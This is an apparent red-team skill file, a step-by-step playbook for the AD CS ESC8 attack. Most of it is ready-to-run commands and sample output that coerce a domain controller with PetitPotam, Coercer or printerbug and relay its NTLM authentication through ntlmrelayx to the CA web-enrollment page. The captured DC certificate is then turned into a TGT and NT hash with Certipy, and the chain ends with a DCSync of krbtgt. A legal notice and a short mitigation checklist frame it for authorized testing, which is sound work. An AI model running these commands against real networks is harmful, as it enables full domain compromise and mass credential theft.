---
name: relaying-ntlm-for-adcs-esc8
description: Uses Impacket's ntlmrelayx.py with a coercion tool (PetitPotam, Coercer, printerbug) to relay NTLM authentication from a coerced domain controller into the AD CS HTTP web-enrollment endpoint (ESC8), obtaining a DC certificate usable via Certipy for PKINIT/DCSync. Use when internal AD penetration tests or purple-team exercises find AD CS Web Enrollment lacking Extended Protection for Authentication. Do not use for triggering the machine-account authentication coercion that feeds the relay - use coercing-authentication-with-coercer-petitpotam.
domain: cybersecurity
subdomain: red-teaming
tags:
- red-team
- ntlm-relay
- adcs
- esc8
- impacket
- certipy
- active-directory
- privilege-escalation
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- DE.CM-01
mitre_attack:
- T1557.001
---
# Relaying NTLM for ADCS ESC8

> **Legal Notice:** This skill is for authorized penetration testing, red-team engagements, and educational purposes only. Coercing authentication and relaying credentials against systems you do not own or lack explicit written authorization to test is illegal. Operate strictly within a signed rules-of-engagement; ESC8 coercion can affect production domain controllers.

## Overview

ESC8 is one of the Active Directory Certificate Services (AD CS) escalation paths catalogued by SpecterOps in "Certified Pre-Owned." It abuses the AD CS **HTTP web-enrollment endpoint** (`/certsrv/`), which by default supports NTLM authentication and, critically, does **not** enforce HTTPS channel binding or Extended Protection for Authentication (EPA). Because NTLM over HTTP on that endpoint is unprotected, an attacker can **coerce** a privileged machine account (typically a domain controller) into authenticating to an attacker-controlled host, then **relay** that NTLM authentication to the CA's web-enrollment page and request a certificate **as the coerced machine**.

When the relayed victim is a domain controller, the attacker obtains a certificate for the DC's machine account (`DC01$`). That certificate can then be used for Kerberos PKINIT to request a TGT as the DC, recover the DC's NT hash, and ultimately perform DCSync — a full domain compromise. This maps to MITRE ATT&CK **T1557.001 (Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay)**, extended here to NTLM relay against an HTTP enrollment service.

The standard toolchain is **Impacket's `ntlmrelayx.py`** (the relay engine, with `--adcs` mode), a coercion tool (**PetitPotam**, **Coercer**, **printerbug.py/dementor**), and **Certipy** for enumeration and for turning the captured certificate into a TGT / NT hash.

## When to Use

- During an internal AD penetration test where AD CS with the HTTP Web Enrollment role is present and EPA is not enforced.
- When you have a foothold (even an unauthenticated network position with a coercion vector) and want a path to Domain Admin via certificate impersonation.
- When validating that the organization has mitigated ESC8 (EPA enabled, HTTP enrollment disabled, RPC/EFSRPC coercion patched).
- During purple-team exercises to test detection of coercion + relay + anomalous certificate enrollment.

## Prerequisites

- A network position that can reach the CA web-enrollment endpoint and a coercion vector to the target DC.
- The CA hostname and an enrollable template that yields client-auth EKU (e.g., `DomainController`, `Machine`).
- Tooling (install from official upstreams):

```bash
# Impacket (provides ntlmrelayx.py / impacket-ntlmrelayx)
pipx install impacket

# Certipy (AD CS enumeration + abuse)
pipx install certipy-ad

# Coercion tools
git clone https://github.com/topotam/PetitPotam.git
pipx install coercer            # https://github.com/p0dalirius/Coercer
# printerbug.py ships with Impacket examples (MS-RPRN)
```

## Objectives

- Enumerate AD CS to confirm an ESC8-vulnerable web-enrollment endpoint.
- Stand up `ntlmrelayx` in `--adcs` mode targeting the CA enrollment URL.
- Coerce a domain controller to authenticate to the relay (PetitPotam/Coercer/printerbug).
- Capture the base64 certificate issued for the DC machine account.
- Use Certipy to convert the certificate into a TGT and recover the DC NT hash.
- Validate domain compromise (DCSync) and document mitigations.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic | Relevance |
|--------------|------|--------|-----------|
| T1557.001 | Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay | Credential Access / Collection | The core ESC8 primitive relays coerced NTLM authentication to the AD CS HTTP endpoint. |
| T1187 | Forced Authentication | Credential Access | PetitPotam/printerbug coerce the DC to authenticate to the attacker. |
| T1649 | Steal or Forge Authentication Certificates | Credential Access | The attack yields a certificate for the DC machine account used for PKINIT. |
| T1003.006 | OS Credential Dumping: DCSync | Credential Access | The recovered DC identity enables DCSync for full domain compromise. |

## Workflow

### 1. Enumerate AD CS for ESC8

Use Certipy to find enabled, vulnerable templates and confirm a web-enrollment endpoint:

```bash
certipy find -u attacker@corp.local -p 'Password123!' -dc-ip 10.0.0.10 -vulnerable -enabled -stdout
```

Look for `ESC8` in the output and note the CA's web-enrollment URL (e.g., `http://ca01.corp.local/certsrv/certfnsh.asp`).

### 2. Start the NTLM relay in ADCS mode

Point `ntlmrelayx` at the CA's web-enrollment endpoint and request a `DomainController` template certificate. `--adcs` enables AD CS relay; `-smb2support` accepts SMB2 coerced auth:

```bash
impacket-ntlmrelayx \
  -t http://ca01.corp.local/certsrv/certfnsh.asp \
  -smb2support \
  --adcs \
  --template DomainController
```

For relaying a member server/workstation instead of a DC, use `--template Machine` (or `User` for a user account).

### 3. Coerce the domain controller to authenticate

Trigger the DC to authenticate to the relay listener using a coercion primitive.

PetitPotam (MS-EFSRPC):

```bash
# python3 PetitPotam.py <listener/attacker IP> <target DC IP>
python3 PetitPotam.py -u attacker -p 'Password123!' -d corp.local 10.0.0.50 10.0.0.10
```

Coercer (multi-protocol coercion):

```bash
coercer coerce -u attacker -p 'Password123!' -d corp.local -l 10.0.0.50 -t 10.0.0.10
```

printerbug.py (MS-RPRN, ships with Impacket):

```bash
python3 printerbug.py corp.local/attacker:'Password123!'@10.0.0.10 10.0.0.50
```

### 4. Capture the issued certificate

When the coerced DC authenticates, `ntlmrelayx` relays it to the CA and prints output similar to:

```
[*] Authenticating against http://ca01.corp.local as CORP/DC01$ SUCCEED
[*] GOT CERTIFICATE! ID 1337
[*] Base64 certificate of user DC01$:
MIIRXAIBAzCC...<snip>...
```

Save the base64 PKCS#12 blob to a `.pfx` file (decode it; the cert has no export password by default):

```bash
echo 'MIIRXAIBAzCC...<snip>...' | base64 -d > dc01.pfx
```

### 5. Convert the certificate to a TGT and NT hash

Use Certipy to authenticate with the certificate via PKINIT, obtaining a Kerberos TGT and the DC machine-account NT hash:

```bash
certipy auth -pfx dc01.pfx -dc-ip 10.0.0.10
```

Certipy outputs a `.ccache` TGT and the NT hash, e.g. `[*] Got hash for 'dc01$@corp.local': aad3b435...:<NTHASH>`.

### 6. Leverage the DC identity (DCSync)

With the DC machine account's hash/TGT, perform DCSync to extract domain credentials (e.g., `krbtgt`, Domain Admins) using the recovered TGT:

```bash
# Use the ccache TGT, then DCSync via secretsdump
export KRB5CCNAME=dc01.ccache
impacket-secretsdump -k -no-pass corp.local/'DC01$'@dc01.corp.local -just-dc-user krbtgt
```

### 7. Validate mitigations (defensive checklist)

Confirm the environment is hardened against ESC8 after testing:

- Enable Extended Protection for Authentication (EPA) on the AD CS web-enrollment IIS site and require HTTPS.
- Disable NTLM on the CA enrollment endpoint; prefer the enrollment proxy with EPA.
- Remove unused HTTP Web Enrollment role services where possible.
- Patch coercion vectors (MS-EFSRPC/PetitPotam, MS-RPRN/printerbug) and restrict RPC.
- Monitor for forced authentication and anomalous machine-account certificate enrollment.

## Tools and Resources

| Tool | Purpose | Link |
|------|---------|------|
| Impacket ntlmrelayx | NTLM relay engine with `--adcs` mode | https://github.com/fortra/impacket |
| Certipy | AD CS enumeration and certificate abuse | https://github.com/ly4k/Certipy |
| PetitPotam | MS-EFSRPC coercion | https://github.com/topotam/PetitPotam |
| Coercer | Multi-protocol coercion | https://github.com/p0dalirius/Coercer |
| Certified Pre-Owned (SpecterOps) | Original AD CS abuse research | https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf |
| SpecterOps CoerceAndRelayNTLMToADCS | ESC8 edge reference | https://bloodhound.specterops.io/resources/edges/coerce-and-relay-ntlm-to-adcs |

## Validation Criteria

- [ ] AD CS enumerated and an ESC8-vulnerable web-enrollment endpoint confirmed with `certipy find -vulnerable`.
- [ ] `ntlmrelayx --adcs --template DomainController` listener running against the CA URL.
- [ ] Coercion (PetitPotam/Coercer/printerbug) triggered against the target DC.
- [ ] Base64 certificate for the DC machine account captured and saved as `.pfx`.
- [ ] Certificate converted to a TGT and NT hash with `certipy auth`.
- [ ] Domain compromise validated via DCSync (in scope only).
- [ ] EPA/HTTPS and coercion-patch mitigations verified and documented.
